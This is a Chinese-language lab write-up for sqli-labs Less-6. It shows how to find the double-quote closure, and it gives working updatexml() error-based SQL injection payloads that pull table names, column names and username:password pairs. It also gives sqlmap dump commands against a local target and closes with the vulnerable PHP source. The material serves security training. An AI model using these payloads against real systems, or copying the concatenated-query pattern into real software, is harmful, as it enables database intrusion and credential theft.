---
title: Sqli-labs Less-6 Writeup 
date: 2026-11-03 
category: [Web安全, CTF]
tags: [Sqli-labs, SQL注入, 报错注入, 盲注, updatexml]
---

## 一、 漏洞概述
*   **靶场名称**：sqli-labs
*   **关卡**：Less-6
*   **漏洞类型**：基于双引号的字符型注入 / 报错盲注
*   **后端 SQL 语句**：`SELECT * FROM users WHERE id="$id" LIMIT 0,1`
*   **本关特点**：与 Less-5 一样，页面**没有数据回显位**，只有 "You are in..." 或空白/报错。区别在于闭合符号从单引号变成了双引号 `"`。

## 二、 注入点探测与闭合方式判断

### 1. 正常访问
访问 `?id=1`，页面显示：
```text
You are in...
```

### 2. 单引号试探 (无效)

访问 ?id=1'，页面正常显示 You are in...。说明不是单引号闭合（被当做普通字符串处理了）。

### 3. 双引号试探与闭合

访问 ?id=1"，页面报错：

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"" LIMIT 0,1' at line 1
```

访问 ?id=1" --+，页面恢复正常。
结论：闭合方式为双引号 "。

## 三、 手工注入实战 (报错注入法)

既然同样是“没有回显”，我们继续使用 updatexml() 报错注入大法，只需将 Payload 中的单引号换成双引号即可。

### 1. 爆出当前数据库名

```http
?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```

· 页面回显：XPATH syntax error: '~security~'
· 成功获取数据库名：security。

### 2. 爆出表名 (配合 limit 逐条获取)

获取第一个表名：

```http
?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) --+
```

· 回显：~emails~
· 修改 limit 1,1 可获取 referers，limit 3,1 获取 users。

### 3. 爆出 users 表的字段名

获取第一个字段名：

```http
?id=1" and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1) --+
```

· 回显：~id~
· 修改 limit 可依次获取 username 和 password。

### 4. 提取账号密码数据

拼接账号和密码（使用 0x3a 即冒号）：

```http
?id=1" and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+
```

· 回显：~Dumb:Dumb~
· 修改 limit 1,1 继续获取第二组数据。

## 四、 自动化工具测试 (SQLMap)

使用 SQLMap 可以直接识别出闭合方式并跑出数据：

### 1. 直接指定数据库和表进行 dump：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-6/?id=1" --batch -D security -T users --dump
```

### 2. 如果你想观察 SQLMap 是如何识别闭合的，可以加上 -v 3 查看 Payload：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-6/?id=1" --batch -v 3
```

## 五、 源码分析

查看 Less-6 的 PHP 源码：

```php
$id = '"' . $_GET['id'] . '"'; // 注意这里包裹的是双引号
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; 
$result=mysql_query($sql);

if($row){
    echo 'You are in...';
} else {
    print_r(mysql_error()); // 依然输出了报错信息
}
```

· 成因：代码直接将 $id 用双引号包裹拼接到 SQL 语句中，并且通过 print_r(mysql_error()) 输出了数据库报错信息，导致了基于双引号的报错注入。

